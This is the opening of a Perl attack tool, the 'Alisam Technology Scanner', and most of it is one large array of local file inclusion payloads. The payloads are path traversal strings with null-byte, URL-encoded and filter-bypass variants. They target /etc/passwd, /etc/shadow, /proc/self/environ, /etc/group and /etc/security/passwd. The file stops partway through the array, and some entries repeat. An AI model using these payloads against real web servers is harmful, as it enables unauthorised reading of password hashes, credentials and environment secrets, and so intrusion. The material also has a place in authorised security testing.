#!/usr/bin/perl
#Alisam Technology Scanner
#Requiered libreries
#apt-get install libxml-simple-perl
#aptitude install libio-socket-ssl-perl
#aptitude install libcrypt-ssleay-perl
use Term::ANSIColor;
use IO::Socket::INET;
use LWP::UserAgent;
my $ua = LWP::UserAgent->new();
$ua->env_proxy;
$ua->timeout(10);
use File::Basename;
use FindBin '$Bin';
use warnings;
system(($^O eq 'MSWin32') ? 'cls' : 'clear');

###################################################################		
print color 'bold cyan';
print "\n";
print "        ###    ########  ######   ######     ###    ##    ##     ";
print color 'red';
print "(^).-.(^)\n";
print color RESET;
print color 'bold cyan';
print "       ## ##      ##    ##    ## ##    ##   ## ##   ###   ##      ";
print color 'red';
print "(.O_O.)\n";
print color RESET;
print color 'bold cyan';
print "      ##   ##     ##    ##       ##        ##   ##  ####  ##    ";
print color 'red';
print "__(( A ))__\n";
print color RESET;
print color 'bold cyan';
print "     ##     ##    ##     ######  ##       ##     ## ## ## ##   ";
print color 'red';
print "(_.-('-')-._)\n";
print color RESET;
print color 'bold cyan';
print "     #########    ##          ## ##       ######### ##  ####      ";
print color 'red';
print "|| T ||\n";
print color RESET;
print color 'bold cyan';
print "     ##     ##    ##    ##    ## ##    ## ##     ## ##   ###    ";
print color 'red';
print "_.' `-' '._\n";
print color RESET;
print color 'bold cyan';
print "     ##     ##    ##     ######   ######  ##     ## ##    ##    ";
print color 'red';
print "`-'--^--`-'\n";
print "___________________( No monopoly for knowledge )_______________/-------------/\n";
print color RESET;
print "\n";

if (!@ARGV) {
  print color 'bold yellow';
  print "[!] Correct use ./",basename($0)," <option>\n";
  print "[!] Correct use ./",basename($0)," --help\n";
  print color RESET;
  exit();
}else{
  print color 'bold';
  print "[ ] ---------------------------------------------------------------------------\n";
  print color RESET;
  desclaimer();
}  

#######################################################
sub LFI {@LFI =("/passwd.txt", "/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","....//etc/passwd","....//....//etc/passwd","....//....//....//etc/passwd","....//....//....//....//etc/passwd","....//....//....//....//....//etc/passwd","....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//....//etc/passwd","....//etc/passwd%00","....//....//etc/passwd%00","....//....//....//etc/passwd%00","....//....//....//....//etc/passwd%00","....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/passwd%00","%2Fetc%2Fpasswd","..%2Fetc%2Fpasswd","..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","%2Fetc%2Fpasswd%00","..%2Fetc%2Fpasswd%00","..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","....%2f%2Fetc/passwd","....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","/proc/self/environ","../proc/self/environ","../../proc/self/environ","../../../proc/self/environ","../../../../proc/self/environ","../../../../../proc/self/environ","../../../../../../proc/self/environ","../../../../../../../proc/self/environ","../../../../../../../../proc/self/environ","../../../../../../../../../proc/self/environ","../../../../../../../../../../proc/self/environ","/proc/self/environ%00","../proc/self/environ%00","../../proc/self/environ%00","../../../proc/self/environ%00","../../../../proc/self/environ%00","../../../../../proc/self/environ%00","../../../../../../proc/self/environ%00","../../../../../../../proc/self/environ%00","../../../../../../../../proc/self/environ%00","../../../../../../../../../proc/self/environ%00","../../../../../../../../../../proc/self/environ%00","%2Fproc%2Fself%2Fenviron","..%2Fproc%2Fself%2Fenviron","..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","%2Fproc%2Fself%2Fenviron%00","..%2Fproc%2Fself%2Fenviron%00","..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","//proc/self/environ","....//proc/self/environ","....//....//proc/self/environ","....//....//....//proc/self/environ","....//....//....//....//proc/self/environ","....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//....//proc/self/environ","//proc/self/environ%00","....//proc/self/environ%00","....//....//proc/self/environ%00","....//....//....//proc/self/environ%00","....//....//....//....//proc/self/environ%00","....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//....//proc/self/environ%00","%2f%2Fproc/self/environ","....%2f%2Fproc/self/environ","....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","%2f%2Fproc/self/environ%00","....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F..<!---->..%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","/etc/shadow","../etc/shadow","../../etc/shadow","../../../etc/shadow","../../../../etc/shadow","../../../../../etc/shadow","../../../../../../etc/shadow","../../../../../../../etc/shadow","../../../../../../../../etc/shadow","../../../../../../../../../etc/shadow","../../../../../../../../../../etc/shadow","/etc/shadow%00","../etc/shadow%00","../../etc/shadow%00","../../../etc/shadow%00","../../../../etc/shadow%00","../../../../../etc/shadow%00","../../../../../../etc/shadow%00","../../../../../../../etc/shadow%00","../../../../../../../../etc/shadow%00","../../../../../../../../../etc/shadow%00","../../../../../../../../../../etc/shadow%00","%2Fetc..%2Fshadow","..%2Fetc%2Fshadow","..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","%2Fetc..%2Fshadow%00","..%2Fetc%2Fshadow%00","..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","%2F%2Fetc/shadow","....%2f%2Fetc/shadow","....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","%2F%2Fetc/shadow%00","....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....//etc/shadow","....//....//etc/shadow","....//....//....//etc/shadow","....//....//....//....//etc/shadow","....//....//....//....//....//etc/shadow","....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//....//etc/shadow","....//etc/shadow%00","....//....//etc/shadow%00","....//....//....//etc/shadow%00","....//....//....//....//etc/shadow%00","....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//....//etc/shadow%00","/etc/group","../etc/group","../../etc/group","../../../etc/group","../../../../etc/group","../../../../../etc/group","../../../../../../etc/group","../../../../../../../etc/group","../../../../../../../../etc/group","../../../../../../../../../etc/group","../../../../../../../../../../etc/group","/etc/group%00","../etc/group%00","../../etc/group%00","../../../etc/group%00","../../../../etc/group%00","../../../../../etc/group%00","../../../../../../etc/group%00","../../../../../../../etc/group%00","../../../../../../../../etc/group%00","../../../../../../../../../etc/group%00","../../../../../../../../../../etc/group%00","%2Fetc..%2Fgroup","..%2Fetc%2Fgroup","..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","%2Fetc%2Fgroup%00","..%2Fetc%2Fgroup%00","..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","%2F%2Fetc/group","....%2F%2Fetc/group","....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","/etc/group%00","....%2F%2Fetc/group%00","....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","//etc/group","....//etc/group","....//....//etc/group","....//....//....//etc/group","....//....//....//....//etc/group","....//....//....//....//....//etc/group","....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//....//etc/group","//etc/group%00","....//etc/group%00","....//....//etc/group%00","....//....//....//etc/group%00","....//....//....//....//etc/group%00","....//....//....//....//....//etc/group%00","....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//....//etc/group%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F